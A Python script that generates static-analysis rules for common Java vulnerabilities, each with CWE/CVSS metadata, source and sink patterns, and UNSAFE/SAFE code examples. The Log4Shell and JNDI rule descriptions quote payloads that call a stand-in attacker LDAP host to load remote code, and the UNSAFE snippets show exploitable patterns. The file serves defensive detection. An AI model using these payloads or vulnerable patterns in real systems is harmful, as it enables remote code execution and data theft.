from rule_writer import write_rule

JAVA_SOURCES = [
    "request.getParameter(", "request.getParameterValues(", "request.getHeader(", "request.getHeaders(",
    "request.getCookies(", "request.getInputStream(", "request.getReader(", "request.getQueryString(",
    "request.getPathInfo(", "@RequestParam", "@PathVariable", "@RequestBody", "@RequestHeader", "@CookieValue"
]

def gen_java_rules():
    write_rule(
        "java", "java_sqli", "SQLi", "Critical", "CWE-89", "A03:2021-Injection", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Confirmed",
        "SQL Injection via unparameterized JDBC/JPA queries",
        "User-controlled data is concatenated into a SQL or JPQL query string. Attackers can inject SQL syntax to bypass authentication, read unauthorized records, or execute arbitrary database commands.",
        JAVA_SOURCES,
        ["statement.execute(", "statement.executeQuery(", "statement.executeUpdate(", "preparedStatement.execute(", "connection.createStatement(", "entityManager.createNativeQuery(", "entityManager.createQuery(", "session.createQuery(", "session.createSQLQuery(", "jdbcTemplate.execute(", "jdbcTemplate.query(", "jdbcTemplate.queryForObject(", "jdbcTemplate.update("],
        ["prepareStatement(", "PreparedStatement", "setString(", "setInt(", "setLong(", "@Query", "NamedParameterJdbcTemplate"],
        "Use parameterized queries via PreparedStatement or use safe ORM methods (like JPA named parameters). Never concatenate user input directly into SQL strings.\n\nUNSAFE:\n  String query = \"SELECT * FROM users WHERE name='\" + user + \"'\";\n  statement.executeQuery(query);\n\nSAFE:\n  PreparedStatement ps = conn.prepareStatement(\"SELECT * FROM users WHERE name=?\");\n  ps.setString(1, user);\n  ps.executeQuery();"
    )

    write_rule(
        "java", "java_cmdi", "CMDi", "Critical", "CWE-78", "A03:2021-Injection", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Confirmed",
        "Command Injection via Runtime.exec or ProcessBuilder",
        "User input is passed directly to Runtime.exec() or ProcessBuilder. Attackers can inject shell metacharacters to execute arbitrary operating system commands on the server.",
        JAVA_SOURCES,
        ["Runtime.exec(", "Runtime.getRuntime().exec(", "ProcessBuilder(", "new ProcessBuilder(", "new Process("],
        [],
        "Do not use Runtime.exec() with string concatenation. Use ProcessBuilder and pass arguments as a list of strings rather than a single string to avoid shell evaluation.\n\nUNSAFE:\n  Runtime.getRuntime().exec(\"ping \" + ip);\n\nSAFE:\n  new ProcessBuilder(\"ping\", ip).start();"
    )

    write_rule(
        "java", "java_xss", "XSS", "High", "CWE-79", "A03:2021-Injection", 6.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "Confirmed",
        "Cross-Site Scripting (XSS) via unescaped response writer",
        "User input is written directly to the HTTP response without HTML encoding. Attackers can inject malicious JavaScript which executes in the victim's browser context.",
        JAVA_SOURCES,
        ["response.getWriter().write(", "response.getWriter().print(", "response.getWriter().println(", "out.println(", "PrintWriter.write(", "model.addAttribute("],
        ["ESAPI.encoder().encodeForHTML(", "StringEscapeUtils.escapeHtml4(", "HtmlUtils.htmlEscape(", "Encode.forHtml("],
        "Always HTML-encode user input before rendering it in the response, or use a template engine (like Thymeleaf) that auto-escapes output.\n\nUNSAFE:\n  response.getWriter().write(\"<h1>Hello \" + request.getParameter(\"name\") + \"</h1>\");\n\nSAFE:\n  response.getWriter().write(\"<h1>Hello \" + Encode.forHtml(request.getParameter(\"name\")) + \"</h1>\");"
    )

    write_rule(
        "java", "java_xxe", "XXE", "High", "CWE-611", "A05:2021-Security Misconfiguration", 7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "Confirmed",
        "XML External Entity (XXE) Injection via unsafe parser",
        "User-supplied XML is parsed by an XML parser that has not explicitly disabled external entity resolution. Attackers can inject DTDs to read local server files or perform SSRF.",
        JAVA_SOURCES,
        ["DocumentBuilderFactory.newInstance(", "SAXParserFactory.newInstance(", "XMLInputFactory.newInstance(", "TransformerFactory.newInstance(", "SchemaFactory.newInstance(", "XMLReader", "SAXParser"],
        ["factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)", "factory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false)", "factory.setExpandEntityReferences(false)"],
        "Explicitly disable external entity processing and DOCTYPE declarations on the XML parser factory before parsing user input.\n\nUNSAFE:\n  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n  Document doc = dbf.newDocumentBuilder().parse(inputStream);\n\nSAFE:\n  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n  dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n  Document doc = dbf.newDocumentBuilder().parse(inputStream);"
    )

    write_rule(
        "java", "java_path_traversal", "Path Traversal", "High", "CWE-22", "A01:2021-Broken Access Control", 7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "Confirmed",
        "Path Traversal via File IO",
        "User input dictates the file path used in File objects or streams. Attackers can use traversal sequences ('../') to read or write files outside the intended directory.",
        JAVA_SOURCES,
        ["new File(", "Paths.get(", "FileInputStream(", "FileOutputStream(", "FileReader(", "FileWriter(", "Files.readAllBytes(", "Files.write("],
        [],
        "Validate file paths to ensure they reside within the expected base directory. Check the canonical path of the resolved file against the base directory.\n\nUNSAFE:\n  File f = new File(\"/uploads/\" + request.getParameter(\"file\"));\n\nSAFE:\n  File baseDir = new File(\"/uploads/\");\n  File f = new File(baseDir, request.getParameter(\"file\"));\n  if (!f.getCanonicalPath().startsWith(baseDir.getCanonicalPath())) throw new Exception();"
    )

    write_rule(
        "java", "java_ssrf", "SSRF", "High", "CWE-918", "A10:2021-Server-Side Request Forgery", 8.6, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", "Confirmed",
        "Server-Side Request Forgery via URL connections",
        "User input constructs a URL that the Java application then requests. Attackers can scan internal networks or access internal services (like AWS metadata).",
        JAVA_SOURCES,
        ["new URL(", "URLConnection", "HttpURLConnection", "HttpClient.execute(", "HttpClient.send("],
        [],
        "Validate requested URLs against a strict allowlist of allowed hostnames. Do not allow users to specify arbitrary URLs for the server to fetch.\n\nUNSAFE:\n  HttpURLConnection conn = (HttpURLConnection) new URL(userInput).openConnection();\n\nSAFE:\n  // Validate userInput against allowed domain list before opening connection"
    )

    write_rule(
        "java", "java_deserialization", "Deserialization", "Critical", "CWE-502", "A08:2021-Software and Data Integrity Failures", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Confirmed",
        "Insecure Deserialization via ObjectInputStream or XStream",
        "Untrusted data is passed to insecure deserializers like ObjectInputStream or XStream without type validation. Attackers can craft malicious serialized objects that execute arbitrary code upon deserialization.",
        JAVA_SOURCES,
        ["ObjectInputStream(", "readObject(", "readUnshared(", "XMLDecoder(", "XStream.fromXML(", "Yaml.load(", "new ObjectMapper().readValue("],
        [],
        "Do not use Java native serialization (ObjectInputStream) for untrusted data. Use safer formats like JSON (Jackson/Gson) without polymorphic type handling enabled, or use ValidatingObjectInputStream.\n\nUNSAFE:\n  Object obj = new ObjectInputStream(inputStream).readObject();\n\nSAFE:\n  // Use JSON parsing with strict class types"
    )

    write_rule(
        "java", "java_ldap_injection", "LDAP Injection", "High", "CWE-90", "A03:2021-Injection", 7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "Confirmed",
        "LDAP Injection via InitialDirContext search",
        "User input is used to dynamically construct LDAP search filters. Attackers can inject special characters to bypass authentication or extract unauthorized information.",
        JAVA_SOURCES,
        ["ctx.search(", "dirContext.search("],
        [],
        "Use parameterized LDAP queries (JNDI search controls) instead of string concatenation for search filters.\n\nUNSAFE:\n  ctx.search(\"ou=users\", \"(uid=\" + username + \")\", controls);\n\nSAFE:\n  ctx.search(\"ou=users\", \"(uid={0})\", new Object[]{username}, controls);"
    )

    write_rule(
        "java", "java_xpath_injection", "XPath Injection", "High", "CWE-643", "A03:2021-Injection", 7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "Confirmed",
        "XPath Injection via XPathExpression",
        "User input is concatenated into an XPath query string. Attackers can alter the query logic to bypass authentication or access unauthorized XML nodes.",
        JAVA_SOURCES,
        ["xpath.compile(", "xpath.evaluate("],
        [],
        "Use precompiled XPath expressions with variables (XPathVariableResolver) instead of concatenating strings.\n\nUNSAFE:\n  xpath.evaluate(\"//user[name='\" + name + \"']\", doc);\n\nSAFE:\n  // Implement and use XPathVariableResolver to bind 'name' safely"
    )

    write_rule(
        "java", "java_log_injection", "Log Injection", "Critical", "CWE-117", "A09:2021-Security Logging and Monitoring Failures", 10.0, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "Confirmed",
        "Log Injection (Log4Shell) via unsanitized user input passed to Log4j2 logger",
        "User input is directly logged using Log4j2 without sanitization. In vulnerable versions of Log4j2 (2.0-beta9 through 2.16.0), the logger processes JNDI lookup strings embedded in log messages (e.g., ${jndi:ldap://attacker.com/x}). An attacker who controls any logged value can trigger a remote JNDI lookup, causing the server to load and execute arbitrary code from an attacker-controlled LDAP server. This is CVE-2021-44228, rated CVSS 10.0.",
        JAVA_SOURCES,
        ["logger.info(", "logger.error(", "logger.debug(", "logger.warn(", "logger.fatal(", "log.info(", "log.error(", "log.debug(", "log.warn(", "LOG.info(", "LOG.error("],
        [],
        "Upgrade Log4j2 to version 2.17.1 or later (for Java 8+). This completely removes JNDI lookup support from message formatting.\n\nIf you cannot upgrade immediately, set the JVM property:\n  -Dlog4j2.formatMsgNoLookups=true\nor set the environment variable:\n  LOG4J_FORMAT_MSG_NO_LOOKUPS=true\n\nAdditionally, never log user-controlled input without sanitization:\nUNSAFE: logger.info(\"User login: \" + request.getHeader(\"X-User\"));\nSAFE:   logger.info(\"User login: {}\", sanitize(request.getHeader(\"X-User\")));"
    )

    write_rule(
        "java", "java_jndi_injection", "Code Injection", "Critical", "CWE-917", "A03:2021-Injection", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Confirmed",
        "JNDI Injection via user-controlled lookup string in InitialContext.lookup()",
        "User input is passed directly to InitialContext.lookup() or context.lookup(). An attacker can supply a malicious JNDI URL (e.g., ldap://attacker.com/payload) that causes the JVM to load and instantiate a remote class from an attacker-controlled server, resulting in arbitrary Remote Code Execution. This pattern is the root cause of Log4Shell and related JNDI injection vulnerabilities.",
        JAVA_SOURCES,
        ["InitialContext.lookup(", "context.lookup(", "dirContext.lookup(", "ctx.lookup("],
        [],
        "Never pass user-controlled data to JNDI lookup methods. If JNDI lookups are required, use a strict allowlist of permitted JNDI names and validate the input before passing it to lookup().\n\nUNSAFE:\n  Context ctx = new InitialContext();\n  ctx.lookup(request.getParameter(\"resource\"));\n\nSAFE:\n  // Validate that 'resource' is in the allowlist of known safe JNDI names\n  if (ALLOWED_RESOURCES.contains(resource)) {\n      ctx.lookup(resource);\n  }"
    )

    write_rule(
        "java", "java_weak_crypto", "Weak Crypto", "Medium", "CWE-328", "A02:2021-Cryptographic Failures", 5.9, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", "Confirmed",
        "Use of Weak Cryptographic Algorithms (MD5/SHA1/DES)",
        "The application uses deprecated cryptographic algorithms (MD5, SHA1, DES) or insecure random number generators (Math.random). These algorithms can be compromised by attackers.",
        [],
        ["MessageDigest.getInstance(\"MD5\"", "MessageDigest.getInstance(\"SHA-1\"", "MessageDigest.getInstance(\"SHA1\"", "Cipher.getInstance(\"DES\"", "Cipher.getInstance(\"DESede\"", "Cipher.getInstance(\"RC4\"", "Cipher.getInstance(\"AES/ECB\"", "new Random(", "Math.random("],
        ["MessageDigest.getInstance(\"SHA-256\"", "MessageDigest.getInstance(\"SHA-512\"", "MessageDigest.getInstance(\"SHA3-256\"", "Cipher.getInstance(\"AES/GCM\"", "SecureRandom("],
        "Use modern algorithms like SHA-256 or AES-GCM. For cryptographic randomness, use java.security.SecureRandom instead of java.util.Random.\n\nUNSAFE:\n  MessageDigest md = MessageDigest.getInstance(\"MD5\");\n\nSAFE:\n  MessageDigest md = MessageDigest.getInstance(\"SHA-256\");"
    )

    write_rule(
        "java", "java_open_redirect", "Open Redirect", "Medium", "CWE-601", "A01:2021-Broken Access Control", 6.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "Confirmed",
        "Open Redirect via response.sendRedirect",
        "User input controls the destination of an HTTP redirect. Attackers can construct links that redirect users to malicious websites, facilitating phishing campaigns.",
        JAVA_SOURCES,
        ["response.sendRedirect(", "new ModelAndView("],
        [],
        "Validate redirect URLs against an allowlist, or ensure the URL is a relative path to prevent redirecting to external domains.\n\nUNSAFE:\n  response.sendRedirect(request.getParameter(\"next\"));\n\nSAFE:\n  String next = request.getParameter(\"next\");\n  if (next != null && next.startsWith(\"/\") && !next.startsWith(\"//\")) {\n      response.sendRedirect(next);\n  }"
    )

    write_rule(
        "java", "java_mass_assignment", "Misconfiguration", "Medium", "CWE-915", "A01:2021-Broken Access Control", 5.3, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N", "Confirmed",
        "Mass Assignment / Insecure Binding in Spring",
        "The application binds user input directly to a domain object without using a Data Transfer Object (DTO) or specifying allowed fields. Attackers can modify unauthorized fields (e.g., isAdmin, role).",
        JAVA_SOURCES,
        ["@ModelAttribute"],
        ["@InitBinder", "setAllowedFields(", "setDisallowedFields("],
        "Use Data Transfer Objects (DTOs) that only contain the fields meant to be modified by the user, or explicitly configure WebDataBinder to restrict allowed fields.\n\nUNSAFE:\n  public String update(@ModelAttribute User user) { ... }\n\nSAFE:\n  public String update(@ModelAttribute UserDTO userDto) { ... }"
    )

if __name__ == '__main__':
    gen_java_rules()
